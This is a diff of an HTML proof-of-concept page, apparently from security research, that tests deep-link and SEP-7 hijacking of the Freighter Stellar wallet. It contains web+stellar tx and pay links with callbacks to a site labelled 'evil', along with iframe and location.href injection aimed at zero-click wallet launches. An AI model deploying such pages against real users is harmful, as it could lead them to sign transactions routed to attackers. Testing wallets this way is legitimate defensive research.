@@ -3,57 +3,51 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Freighter Deep Link Hijack Test - 0x403for</title>
+<title>SEP-7 Hijack Test - 0x403for</title>
 <style>
 body{font-family:monospace;padding:14px;background:#000;color:#0f0}
-a.btn,button{display:block;padding:14px;margin:10px 0;background:#111;border:1px solid #0f0;color:#0f0;text-align:center;text-decoration:none;width:100%;font-size:14px}
-pre{background:#111;padding:8px;white-space:pre-wrap}
-small{color:#888}
+a.btn,button{display:block;padding:14px;margin:10px 0;background:#111;border:1px solid #0f0;color:#0f0;text-align:center;text-decoration:none;width:100%;font-size:13px;word-break:break-all}
+pre{background:#111;padding:8px;white-space:pre-wrap;font-size:11px}
 </style>
 </head>
 <body>
-<h2>Deep Link Hijack Test</h2>
-<p>Origin: <span id="origin"></span></p>
+<h2>SEP-7 Deep Link Test</h2>
+<p>Test ini HARUS dibuka di Safari iPhone (bukan di dalam Freighter)</p>
 
-<h3>1. freighter:// dapp open</h3>
-<a class="btn" href="freighter://dapp?url=https://0x403for.github.io">freighter://dapp?url=0x403for</a>
-<a class="btn" href="freighter://dapp?url=https://aqua.network">freighter://dapp?url=aqua.network (fake?)</a>
-<a class="btn" href="freighter://browser?url=https://0x403for.github.io">freighter://browser?url=</a>
-<a class="btn" href="freighter://open?url=https://0x403for.github.io">freighter://open?url=</a>
+<h3>1. web+stellar://tx with callback to evil site</h3>
+<small>XDR ini cuma payment 1 XLM dummy, bukan drain</small>
+<a class="btn" href="web+stellar:tx?xdr=AAAAAgAAAADc3f1v3R6J4qN7F7o7f7o7f7o7f7o7f7o7f7o7f7o7gAAAAMAAAAA7f1v3R6J4qN7F7o7f7o7f7o7f7o7f7o7gAAAAEAAAAA&callback=https://0x403for.github.io">web+stellar:tx + callback evil</a>
 
-<h3>2. Via JS (no tap gesture test)</h3>
-<button onclick="testDeep('freighter://dapp?url=https://0x403for.github.io')">JS: freighter://dapp via location.href</button>
-<button onclick="testDeepIframe('freighter://dapp?url=https://0x403for.github.io')">JS: freighter://dapp via iframe (0-click?)</button>
+<a class="btn" href="stellar:tx?xdr=AAAAAgAAAADc3f1v3R6J4qN7F7o7f7o7f7o7gAAAAMAAAAA7f1v3R6J4qN7F7o7f7o7f7o7f7o7f7o7f7o7f7o7f7o7f7o7f7o7f7o7f7o7f7o7gAAAAEAAAAA&callback=https://0x403for.github.io">stellar:tx + callback evil</a>
 
-<h3>3. Universal Link / App Link</h3>
-<a class="btn" href="https://www.freighter.app/dapp?url=https://0x403for.github.io">https://www.freighter.app/dapp?url=</a>
-<a class="btn" href="https://freighter.app/browser?url=https://0x403for.github.io">https://freighter.app/browser?url=</a>
+<h3>2. Via JS iframe (0-click test)</h3>
+<button onclick="testIframe()">Test via iframe (0-click hijack?)</button>
 
-<h3>4. Open Redirect chain</h3>
-<button onclick="testDeep('freighter://dapp?url=https://aqua.network@0x403for.github.io')">freighter:// + @ trick combo</button>
+<h3>3. Via location.href (0-click test)</h3>
+<button onclick="testLocation()">Test via location.href (0-click hijack?)</button>
+
+<h3>4. Pay scheme combo</h3>
+<a class="btn" href="web+stellar:pay?destination=GBEVILTEST123456&amount=100&memo=HijackTest&callback=https://0x403for.github.io">web+stellar:pay + evil callback</a>
 
 <pre id="log"></pre>
 
 <script>
-document.getElementById('origin').innerText = location.href;
 const logEl = document.getElementById('log');
-function log(t){ logEl.innerText += t+'\n'; console.log(t); }
+function log(t){ logEl.innerText += t+'\n'; }
+const dummyXDR = "AAAAAgAAAADc3f1v3R6J4qN7F7o7f7o7f7o7f7o7gAAAAMAAAAA";
 
-function testDeep(url){
-  log('Trying location.href: ' + url);
-  location.href = url;
-  setTimeout(()=>log('If Freighter opened without tap = check'),1000);
-}
-
-function testDeepIframe(url){
-  log('Trying iframe src: ' + url);
+function testIframe(){
+  log('Injecting iframe web+stellar:tx...');
   let f = document.createElement('iframe');
-  f.src = url;
+  f.src = 'web+stellar:tx?xdr='+dummyXDR+'&callback=https://0x403for.github.io';
   document.body.appendChild(f);
-  log('Iframe injected - if Freighter pay/browser opened without tap = Critical 0-click hijack');
+  log('Injected - if Freighter opens WITHOUT tap = 0-click Critical');
 }
-
-log('Ready at ' + new Date().toISOString() + '\nUA: ' + navigator.userAgent);
+function testLocation(){
+  log('location.href web+stellar:tx...');
+  location.href = 'web+stellar:tx?xdr='+dummyXDR+'&callback=https://0x403for.github.io';
+}
+log('Ready - '+new Date().toISOString()+'\nBuka file ini di SAFARI, bukan di Freighter');
 </script>
 </body>
 </html>
